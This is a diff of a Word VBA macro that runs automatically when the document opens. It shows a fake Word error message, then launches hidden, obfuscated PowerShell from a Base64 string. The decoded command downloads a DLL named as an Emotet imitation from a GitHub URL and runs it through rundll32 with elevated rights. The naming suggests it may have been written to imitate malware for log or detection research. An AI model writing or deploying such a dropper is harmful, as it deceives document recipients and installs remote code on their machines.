@@ -1,4 +1,4 @@
-Private Sub Document_Open()
+Sub AutoOpen()
 
 Set a = GetObject("winmgmts:Win32_ProcessStartup")
 Set config = a.SpawnInstance_
@@ -8,9 +8,6 @@ commandString = "$csi = New-Object System.Net.WebClient; $csi.Headers['User-Agen
 commandStringB64 = "JABjAHMAaQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAGMAcwBpAC4ASABlAGEAZABlAHIAcwBbACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnAF0AIAA9ACAAJwBNA"
 commandStringB64 = commandStringB64 + "G8AegBpAGwAbABhAC8ANQAuADAAJwA7ACQAYwBzAGkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBiAG8AYgBiAHkAYgBhAGUAcgAvAFcAaQBuAGQAbwB3AHMARQB2AGUAbgB0AEwAbwBnAHMALwByAGEAdwAvAG0AYQBpAG4ALwByAHUAbgBkAGwAbAAzADIALwBlAG0AbwB0AGUAdABJAG0AaQB0AGEAdABpAG8AbgAuAGQAbABsACcALAAgACgAJABlAG4AdgA6AFUAUwBFAFIAUABSAE8ARgBJAE"
 commandStringB64 = commandStringB64 + "wARQAgACsAJwBcAEQAbwBjAHUAbQBlAG4AdABzAFwAZQBtAG8AdABlAHQASQBtAGkAdABhAHQAaQBvAG4AMQAuAGQAbABsACcAKQApADsAIAAkAGEAcgBnAHUAbQBlAG4AdAAgAD0AIAAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFACAAKwAgACcAXABEAG8AYwB1AG0AZQBuAHQAcwBcAGUAbQBvAHQAZQB0AEkAbQBpAHQAYQB0AGkAbwBuADEALgBkAGwAbAAsACAAQwBvAG4AdAByAG8AbABfAFIAdQBuAEQATABMACcAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAByAHUAbgBkAGwAbAAzADIALgBlAHgAZQAgAC0AVgBlAHIAYgAgAHIAdQBuAEEAcwAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAkAGEAcgBnAHUAbQBlAG4AdAA7AA=="
-returnV = b.Create("cmd cmd cmd cmd  /c msg %username% /v Word experienced an error trying to open the file. & P^Ow^er^she^L^L -w hidden -encodedCommand  " & commandStringB64, "C:\Users\", config, processID)
+returnV = b.Create("cmd cmd cmd cmd  /c msg %username% /v Word experienced an error trying to open the file. & P^Ow^er^she^L^L -w hidden -encodedCommand  " & commandStringB64, "C:\Users\Bastian.BACHELOR\Desktop", config, processID)
 
 End Sub
-
-
-
